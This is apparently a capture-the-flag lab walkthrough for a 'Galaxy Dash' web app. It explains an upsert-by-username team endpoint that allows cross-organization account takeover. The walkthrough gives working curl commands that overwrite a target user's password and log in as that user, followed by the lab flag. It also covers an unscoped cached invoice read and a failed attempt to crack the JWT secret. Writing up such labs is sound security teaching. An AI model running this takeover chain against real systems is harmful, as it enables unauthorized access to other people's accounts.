# galaxydash-006 — BugForge Lab Walkthrough

**Difficulty:** Medium (50 pts)
**Tags:** Broken Access Control
**Hint:** "Galaxy Dash have pushed some new updates. For testing you can target user `walt`."
**Vulnerability:** Cross-organization account takeover via an upsert-by-username team-add endpoint
**Flag:** `bug{tctv584HYSTDaqSFrVF4BTxpzAh6NwMz}`

---

## Summary
Galaxy Dash is a B2B intergalactic delivery platform (React SPA + Express + SQLite, HS256 JWT `{id,username,organizationId}` in localStorage). All data endpoints are correctly organization-scoped by the JWT `organizationId` claim. The "new updates" are a team-management feature. `POST /api/team` ("add team member") performs an INSERT-OR-UPDATE keyed on `username`: supplying an existing username does NOT error, it UPDATES that user's row (email, password, role, permissions, and organization_id) with the attacker-supplied values and pulls the user into the attacker's org. There is no check that the username belongs to another organization, so any org_admin can reset the password of ANY account platform-wide = arbitrary account takeover. The seeded user `walt` is the flagged target: logging in as walt returns a `flag` field in the `/api/login` JSON.

## Tech Stack
- React SPA (CRA), Express backend, SQLite
- HS256 JWT (`{id, username, organizationId}`), `Authorization: Bearer`, secret NOT rockyou-crackable
- Multi-tenant: users belong to an organization; roles viewer / delivery_manager / org_admin

## Key Endpoints
| Endpoint | Method | Scoping |
|---|---|---|
| `/api/register` | POST | public; creates a new org (org names not unique) |
| `/api/login` | POST | returns `{token,user,flag?}` — `flag` present for the seeded target account |
| `/api/team` | POST | **VULNERABLE** — upsert by username, no cross-org check |
| `/api/team/:id` | PUT/DELETE | org-scoped (only own org's users) |
| `/api/bookings/:id`, `/api/organization`, `/api/invoices` | GET | org-scoped by JWT |

## Attack Chain
```bash
T="https://<id>.labs-app.bugforge.io"

# 1. Register a normal account (becomes org_admin of a new org)
curl -s -X POST "$T/api/register" -H 'Content-Type: application/json' -d '{
  "username":"atk","email":"atk@x.invalid","password":"Password123!",
  "full_name":"A","org_name":"AtkOrg","business_type":"General","headquarters_planet":"Earth"}'
# -> token (organizationId = mine)

# 2. BAC: add existing user "walt" to my team. The endpoint upserts by username,
#    resetting walt's password to my chosen value (email+password are required and
#    overwrite; full_name is preserved if omitted).
curl -s -X POST "$T/api/team" -H "Authorization: Bearer $ATK" -H 'Content-Type: application/json' -d '{
  "username":"walt","email":"pwn@x.invalid","password":"x",
  "role":"org_admin","permissions":{"can_view_deliveries":true}}'
# -> {"id":2,"message":"Team member added successfully"}   (id 2 = the real seeded walt)

# 3. Log in as walt with the password we just set. The login response carries the flag.
curl -s -X POST "$T/api/login" -H 'Content-Type: application/json' -d '{"username":"walt","password":"x"}'
```
```json
{
  "token":"...","user":{"id":2,"username":"walt",...},
  "flag":"bug{tctv584HYSTDaqSFrVF4BTxpzAh6NwMz}"
}
```

## Discovery Notes
- The register form placeholder literally reads "e.g., Mom's Friendly Robot Company" (walt's Futurama-themed org), a signpost toward the seeded orgs.
- All obvious data endpoints (bookings, invoices, organization, team) are correctly org-scoped; the only bug is the team-add upsert.
- The tell for the upsert: `POST /api/team` with an existing username returns that user's REAL id (walt = id 2, `created_at` = seed time) instead of "username already exists", and the user then appears in the attacker's `GET /api/team`.
- Fields behaviour: `email` and `password` are required and overwrite the target's values; `full_name` is preserved when omitted (proving it is an update, not a create).
- The flag lives in the `/api/login` response body (a `flag` field) for the seeded target account — not in any stored profile field. (Cost me time: I logged in as walt but initially truncated the response and missed the `flag` key after the `user` object.)

## Secondary Bug (not the flag path here)
`GET /api/invoices/:bookingId` has two code paths: first request generates+ownership-checks the invoice; subsequent CACHED reads return the stored row with NO ownership check, so any org can read another org's already-generated invoice (the sibling `GET /api/bookings/:id` is correctly scoped). Same family bug as galaxydash-003. Not usable for the flag here because no invoices are seeded (walt has no bookings).

## Dead Ends
| Tried | Result |
|---|---|
| Cross-org read of bookings/invoices by id | booking read scoped; invoice cached-read unscoped but nothing seeded |
| Mass-assign `organization_id` on register / team-add / booking | ignored (server sets org from JWT) |
| Register with walt's exact org name to "join" org | creates a new org (names not unique) |
| Crack HS256 JWT secret (rockyou) | no hit; can't forge organizationId |
| PUT /api/team/:id password reset in place | PUT only updates role/permissions, ignores password |
| `/api/organization/avatar` + `/api/files/:filename` (the galaxydash-010 chain) | 404, not present in this instance |

## Root Causes
- `POST /api/team` treats an existing username as an update target and rewrites its credentials/org without verifying the caller owns that account or that it belongs to their organization (CWE-639 / CWE-284, missing function-level + object-level authorization on a write).
- Reusing the same handler for "create member" and "add member" turns a convenience feature into platform-wide account takeover.

## CWE / OWASP
- CWE-639 Authorization Bypass Through User-Controlled Key, CWE-284 Improper Access Control, CWE-620 Unverified Password Change
- OWASP A01:2021 Broken Access Control
